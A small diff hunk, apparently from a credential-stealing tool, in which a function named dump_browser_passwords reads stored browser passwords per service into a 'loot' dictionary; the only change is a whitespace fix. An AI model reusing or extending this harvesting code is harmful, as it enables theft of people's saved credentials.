@@ -66,7 +66,7 @@ def dump_browser_passwords():
                         try:
                             passwd=x.read(type="string", maxlen=100, errors='ignore')
                             if service not in loot[browser]:
-                                loot[browser]={service : [passwd]}
+                                loot[browser]={service: [passwd]}
                             else:
                                 loot[browser][service].append(passwd)
                         except Exception as e:
